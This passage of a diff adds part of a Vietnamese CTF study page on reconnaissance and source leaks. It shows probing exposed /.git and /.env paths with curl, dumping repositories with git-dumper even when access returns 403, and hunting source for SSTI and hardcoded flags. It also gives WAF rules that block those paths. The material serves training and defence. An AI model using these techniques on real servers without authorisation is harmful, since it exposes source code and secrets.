+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Recon bước đầu</div><div class="d">Nhận service mới toanh, chưa biết gì. Thử ngay <code>curl http://TARGET/.git/config</code> → trả về nội dung config Git thật ⟹ lộ.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Dump source</div><div class="d">Chạy <code>git-dumper</code>, có toàn bộ source trong vài giây tới vài phút tùy kích thước repo.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Đọc source tìm lỗ hổng</div><div class="d">Thấy <code>app.py</code> có dòng <code>render_template_string(f"...{name}...")</code> ⟹ xác định ngay là SSTI, không cần dò.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Đọc source tìm flag/secret</div><div class="d">Grep <code>git log -p | grep -i flag</code> hoặc tìm trong file config — nếu flag hardcode sẵn (hiếm nhưng có ở challenge dễ), lấy luôn không cần khai thác gì thêm.</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Khai thác đúng mục tiêu</div><div class="d">Dùng payload SSTI đã biết chắc chắn ăn (xem bài SSTI), vì đã đọc source xác nhận trước.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ: VIẾT WAF RULE</div>
+  <h2>Chặn đúng payload, không chặn nhầm request thường</h2>
+  <table>
+    <tr><th>Rule (soi URL path)</th><th>Khớp gì</th></tr>
+    <tr><td><code>^/\.git/</code></td><td>Mọi truy cập vào thư mục .git — gần như không có lý do hợp lệ nào cần truy cập trực tiếp đường dẫn này từ bên ngoài</td></tr>
+    <tr><td><code>^/\.env$</code></td><td>File .env — tương tự, không nên truy cập công khai</td></tr>
+    <tr><td><code>\.(bak|swp|old)$</code></td><td>File backup/tạm phổ biến</td></tr>
+  </table>
+  <div class="note tip"><span class="tag">Đây là nhóm hiếm hoi WAF chặn HIỆU QUẢ CAO</span>Khác với IDOR/Race
+  Condition/Type Juggling, nhóm Recon &amp; Source Leak <strong>chặn được tốt bằng WAF</strong> vì đường dẫn
+  <code>/.git/</code>, <code>/.env</code> gần như <strong>không bao giờ</strong> là request hợp lệ của người
+  dùng thật — rủi ro chặn nhầm cực thấp. Nên ưu tiên áp các rule này sớm ngay từ đầu trận.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi không tìm thấy gì lộ</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
+    <tr><td><code>/.git/config</code> trả 404</td><td>Deploy sạch, không copy thư mục .git lên server — khả năng cao đúng là vậy với service dàn dựng cẩn thận</td><td>Chuyển sang fuzzing diện rộng hơn (ffuf + wordlist lớn) hoặc chấp nhận không có recon shortcut, quay lại dò từng lỗ hổng</td></tr>
+    <tr><td><code>/.git/config</code> trả 403</td><td>Thư mục tồn tại nhưng bị chặn truy cập trực tiếp (có htaccess/nginx rule)</td><td><strong>Vẫn thử git-dumper</strong> — công cụ tải từng file theo tên đoán trước, không cần liệt kê thư mục, có thể vẫn vượt qua được nếu rule chỉ chặn index</td></tr>
+    <tr><td>git-dumper tải được file nhưng <code>git checkout</code> lỗi, source không đầy đủ</td><td>Thiếu object, hoặc .git bị deploy không đầy đủ (chỉ working tree, thiếu history)</td><td>Dùng GitTools Extractor (mục 07.B) để dựng lại tối đa những gì có thể từ phần đã tải</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>Service deploy bằng cách copy nguyên thư mục dự án (bao gồm <code>.git</code>/<code>.env</code>) lên webroot, không có rule chặn các đường dẫn ẩn.</td></tr>
+    <tr><td>❌</td><td>Service build qua pipeline đúng chuẩn (multi-stage Docker build chỉ copy artifact cần thiết, không copy source thô) — không có gì để leak theo cách này.</td></tr>
+    <tr><td>❌</td><td>Web server/reverse proxy đã cấu hình chặn rõ ràng mọi đường dẫn bắt đầu bằng dấu chấm.</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng ví dụ mục 09 bằng tay — curl thử từng path mục 06, nếu .git lộ thì chạy
+  git-dumper, đọc source tìm 1 dòng code có lỗ hổng.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Nhớ thử cả <code>.git/config</code> lẫn <code>.git/HEAD</code> — đôi
+  khi 1 trong 2 lộ trong khi cái kia không (tùy cấu hình chặn).</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> <code>/.git/</code> trả 403 (bị chặn liệt kê). Dùng git-dumper xem có vẫn
+  dump được không, giải thích vì sao có/không.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>git-dumper không cần liệt kê thư mục — nó tự tính tên file object từ
+  <code>config</code>/<code>HEAD</code> đã đọc được trước đó. Nếu các file CON (như
+  <code>.git/objects/ab/cdef...</code>) cũng bị chặn luôn (không chỉ chặn index) thì mới thực sự vô dụng.</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> không có <code>.git</code>, không có <code>.env</code>, robots.txt trống.
+  Thiết kế 1 wordlist fuzz riêng (5-10 mục) nhắm đúng đặc thù 1 service Flask/Python điển hình (không dùng
+  wordlist chung) để tăng khả năng tìm ra file lộ.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Nghĩ tới quy ước đặt tên phổ biến của Python/Flask:
+  <code>requirements.txt</code>, <code>wsgi.py</code>, <code>app.py.bak</code>, <code>__pycache__/</code>,
+  <code>instance/config.py</code>.</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>Recon (reconnaissance)</td><td>Giai đoạn thu thập thông tin ban đầu về mục tiêu trước khi khai thác.</td></tr>
+    <tr><td>Source leak</td><td>Việc mã nguồn/file cấu hình bị lộ công khai do lỗi triển khai.</td></tr>
+    <tr><td>Git object</td><td>Đơn vị lưu trữ nhỏ nhất trong Git (blob/tree/commit), định danh bằng hash, nằm ở đường dẫn cố định theo hash đó.</td></tr>
+    <tr><td>Directory listing</td><td>Tính năng web server tự hiện danh sách file trong 1 thư mục khi không có file index — khác với việc 1 file cụ thể có bị lộ hay không.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Công cụ/tài liệu offline:</strong> <code>~/hoc/CTF/Tools/web/git-dumper/</code>,
+  <code>~/hoc/CTF/Tools/web/GitTools/</code>, <code>ffuf</code> (đã cài), <code>~/hoc/CTF/Tools/web/SecLists/Discovery/</code>,
+  <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/Insecure Source Code Management/</code>.</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("recon-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("recon-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
